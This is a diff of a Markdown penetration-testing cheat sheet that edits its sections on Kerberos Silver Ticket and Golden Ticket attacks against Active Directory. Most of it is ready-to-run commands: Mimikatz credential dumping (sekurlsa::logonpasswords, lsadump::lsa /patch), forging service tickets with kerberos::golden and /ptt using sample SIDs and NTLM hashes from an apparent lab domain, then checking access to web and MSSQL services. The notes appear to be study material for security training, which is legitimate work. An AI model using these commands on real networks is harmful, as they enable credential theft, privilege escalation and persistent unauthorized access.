@@ -171,9 +171,11 @@ list_tokens
 impersonate_token <token>  
 ```
 
-## Silver Ticket - Pass the Ticket
-- It is a persistence and elevation of privilege technique in which a TGS is forged to gain access to a service in an application.
-- Get SID
+## Silver Ticket - Pass the Ticket (Forge own TGS service ticket)
+- Precondition1: Privileged Account Certificate (PAC) validation **not enabled**
+- Precondition2: obtain that account's password hash (via Kerberoasting or other means), it could then forge a TGS for that SPN and access the service that utilizes it
+- Principle: the application blindly trusts the integrity of the service ticket since it is encrypted with a password hash that is, in theory, only known to the service account and the domain controller.
+- Get SID of your current box
 ```
 GetDomainsid (PowerView)
 ```
@@ -181,28 +183,22 @@ or
 ```
 whoami /user
 ```
-- Get Machine Account Hash
+- Get Machine Account Hash (e.g. username: iis_service)
 ```
-Invoke-Mimikatz '"lsadump::lsa /patch"' -ComputerName <hostname_dc>
-```
-- Exploitation mimikatz.exe
-```
-kerberos::purge
-kerberos::list
-kerberos::golden /user:<user> /domain:<domain> /sid:<sid> /target:<hostname.domain> /service:HTTP /rc4:<ervice_account_password_hash> /ptt
+privilege::debug
+sekurlsa::logonpasswords
 ```
 or
 ```
-Invoke-Mimikatz -Command '"kerberos::golden /domain:<domain> /sid:<domainsid> /target:<dc>.<domain> /service:HOST /rc4:<machine_account_hash> /user:Administrator /ptt"'
-kerberos::list
+Invoke-Mimikatz '"lsadump::lsa /patch"' -ComputerName <hostname_dc>
 ```
 
 Complete steps
 ```bash
 #using NTLM generate the Silver Ticket (TGS) and inject it into memory for current session using /ptt
-kerberos::golden /sid:<domainSID> /domain:<domain-name> /ptt /target:<targetsystem.domain> /service:<service-name> /rc4:<NTLM-hash> /user:<new-user> /ptt
-      kerberos: :golden /user:offsec /domain:corp.com /sid: S-1-5-21-4038953314-3014849035-1274281563 /target:CorpSqlServer.corp.com:1433 /service:MSSQLSvc /rc4:E2B475C11DA2A0748290D87AA966C327 /ptt
-      kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369 /domain:corp.com /ptt /target:web04.corp.com /service:http /rc4:4d28cf5252d39971419580a51484ca09 /user:jeffadmin
+kerberos::golden /sid:<domainSID> /domain:<domain-name> /ptt /target:<targetsystem.domain> /service:<service-name> /rc4:<NTLM-hash> /user:<new-user/existing domain user> /ptt
+      kerberos: :golden /user:offsec /domain:corp.com /sid: S-1-5-21-4038953314-3014849035-**1274281563** /target:CorpSqlServer.corp.com:1433 /service:MSSQLSvc /rc4:E2B475C11DA2A0748290D87AA966C327 /ptt
+      kerberos::golden /sid:S-1-5-21-1987370270-658905905-**1781884369** /domain:corp.com /ptt /target:web04.corp.com /service:http /rc4:4d28cf5252d39971419580a51484ca09 /user:jeffadmin
 
 #using NTLM generate the Silver Ticket (TGS) and inject it into memory for current session and output to ticket.kirbi using /ticket flag
 kerberos::golden /sid:<domainSID> /domain:<domain-name> /ptt /target:<targetsystem.domain> /service:<service-name> /rc4:<NTLM-hash> /user:<new-user> /ticket
@@ -213,7 +209,7 @@ kerberos::golden /domain:$DOMAIN/sid:$DOMAIN_SID /aes128:$KRBTGT_AES_128_KEY /us
 # Checking if the forged tickets is in memory
 ps> klist
 
-# verify access to targeted SPN
+# verify access to targeted SPN (http://web04 is the HTTP SPN mapped to iis_service)
 iwr -UseDefaultCredentials http://web04
 
 # Inject the ticket (not needed if the TGS is already loaded in current session)
@@ -228,10 +224,7 @@ cmd> sqlcmd.exe -S [service_hostname]                 # if service is MSSQL
 ```
 
 
-
-
-
-## Golden Ticket - Pass the Ticket
+## Golden Ticket - Pass the Ticket (Forge own TGT)
 - It is a persistence and elevation of privilege technique where tickets are forged to take control of the Active Directory Key Distribution Service (KRBTGT) account and issue TGT's.
 
 - Get hash krbtgt
@@ -665,6 +658,19 @@ impacket-secretsdump -just-dc-user *targetuser* corp.com/jeffadmin:"BrouhahaTung
 3. Finds the newly exported file int he working directory folder: `dir *.kirbi`
 4. Pass the ticket: `mimikatz # kerberos::ptt *[0;12bd0]-0-0-40810000-dave@cifs-web04.kirbi*` or `invoke-mimikatz -Command '"Mimikatz::debug "kerberos::ptt [0;12bd0]-0-0-40810000-dave@cifs-web04.kirbi" "exit"'
 5. To list and show all the tickets that you have: `klist`**
+
+## Silver ticket
+- Exploitation mimikatz.exe
+```
+kerberos::purge
+kerberos::list
+kerberos::golden /user:<user> /domain:<domain> /sid:<sid> /target:<hostname.domain> /service:HTTP /rc4:<service_account_password_hash> /ptt
+```
+or
+```
+Invoke-Mimikatz -Command '"kerberos::golden /domain:<domain> /sid:<domainsid> /target:<dc>.<domain> /service:HOST /rc4:<machine_account_hash> /user:Administrator /ptt"'
+kerberos::list
+```
 
 ## Pass the ticket 2
 1. Use Rubeus instead of mimikatz
